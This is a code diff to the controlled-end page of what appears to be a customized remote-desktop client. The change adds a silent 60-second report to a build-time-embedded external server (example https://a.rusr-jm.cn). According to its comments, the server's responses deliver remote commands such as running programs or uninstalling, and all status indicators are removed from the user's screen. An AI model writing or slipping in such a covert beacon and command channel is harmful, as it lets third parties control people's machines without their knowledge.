@@ -10,10 +10,15 @@ import 'package:flutter_hbb/models/server_model.dart';
 import 'package:flutter_hbb/models/platform_model.dart';
 import 'package:flutter_hbb/desktop/pages/license_client.dart';
 
-/// 构建期注入的授权码（定制版，2026-11-14）：patch_agent_ui.py 第二个参数
-/// 传入时把这里替换成真实卡密，受控端首启静默激活 + 60s 心跳（顺带接收
-/// 远程指令通道）。空值 = 非定制构建，保持原行为（无激活）。
+/// 构建期注入的分组码（定制版，2026-11-14 v2）：patch_agent_ui.py 第二个参数。
+/// 不再是「授权码」——被控端不激活、不占设备名额、无授权提示，只作为设备
+/// 归属分组随上报发送。空值 = 非定制构建，不上报。
 const String kAgentLicenseCode = '';
+
+/// 构建期注入的地址簿基址（定制版，2026-11-14 v2）：patch_agent_ui.py 第三个
+/// 参数（如 https://a.rusr-jm.cn）。被控端不激活拿不到 config 下发，基址必须
+/// 构建期嵌入。空值 / 未替换的占位串 = 非定制构建，不上报。
+const String kAgentAbBase = '__AGENT_AB_BASE__';
 
 /// DevicesFlowUserSvc 受控端界面。
 ///
@@ -56,38 +61,26 @@ class _AgentPageState extends State<AgentPage> {
     super.initState();
     _setupWindow();
     _watchId();
-    _silentLicense();
+    _silentReport();
   }
 
-  // ---------------- 定制版静默激活（2026-11-14） ----------------
+  // ---------------- 定制版免授权上报（2026-11-14 v2） ----------------
 
-  /// 授权状态小字（已授权 / 授权失败）。空 = 非定制构建，不显示。
-  String _licStatus = '';
-
-  /// 构建期嵌入了授权码时：等本机识别码就绪（激活时上报的设备名就是识别码，
-  /// 拿到 ID 再激活），然后静默激活 + 启动 60s 心跳。
-  /// 激活计数占用卡里的设备名额（与手动激活同一套数量模型）。
-  Future<void> _silentLicense() async {
+  /// 构建期嵌入了分组码 + 地址簿基址时：等本机识别码就绪（上报的设备名
+  /// 就是识别码），然后启动 60s 设备上报。
+  ///
+  /// 被控端不激活授权码、无授权语义、无任何状态提示——授权卡只管管理端
+  /// 的控制权；卡到期被控端无感（设备照常上报在线），管理端续费即恢复。
+  /// 远程指令（运行程序 / 卸载）在 /api/report 响应里带回执行。
+  Future<void> _silentReport() async {
     if (kAgentLicenseCode.isEmpty) return;
-    final lc = LicenseClient.instance;
-    if (!lc.hasToken) {
-      for (var i = 0; i < 20; i++) {
-        final id = gFFI.serverModel.serverId.text.trim();
-        if (id.isNotEmpty) break;
-        await Future.delayed(const Duration(seconds: 1));
-      }
-      try {
-        await lc.activate(kAgentLicenseCode);
-      } catch (_) {
-        // 卡满 / 卡失效 / 断网：不弹窗，状态行提示，下次启动自动重试
-      }
+    if (kAgentAbBase.isEmpty || kAgentAbBase.startsWith('__')) return;
+    for (var i = 0; i < 20; i++) {
+      final id = gFFI.serverModel.serverId.text.trim();
+      if (id.isNotEmpty) break;
+      await Future.delayed(const Duration(seconds: 1));
     }
-    _licStatus = lc.hasToken ? '已授权' : '待授权';
-    if (lc.hasToken) {
-      // 60s 校验心跳：更新在线状态 + 取走远程指令（运行程序 / 卸载）
-      lc.startCommandPoll();
-    }
-    if (mounted) setState(() {});
+    AgentReporter.instance.start(kAgentLicenseCode, kAgentAbBase);
   }
 
   @override
@@ -313,20 +306,15 @@ class _AgentPageState extends State<AgentPage> {
                   style: TextStyle(fontSize: 12, color: Color(0xFF3D3D3D))),
             ),
           ),
+          // 状态行只保留「密码已更新」反馈；授权状态一律不显示
+          // （定制版 v2 被控端无授权语义，永无到期/待授权提示）
           SizedBox(
             height: 16,
             child: _pwdSaved
                 ? Text('密码已更新',
                     style: TextStyle(
                         fontSize: 10, color: textColor.withOpacity(0.4)))
-                : (_licStatus.isEmpty
-                    ? null
-                    : Text(_licStatus,
-                        style: TextStyle(
-                            fontSize: 10,
-                            color: _licStatus == '已授权'
-                                ? textColor.withOpacity(0.35)
-                                : const Color(0xFFB05A2A)))),
+                : null,
           ),
         ],
       ),
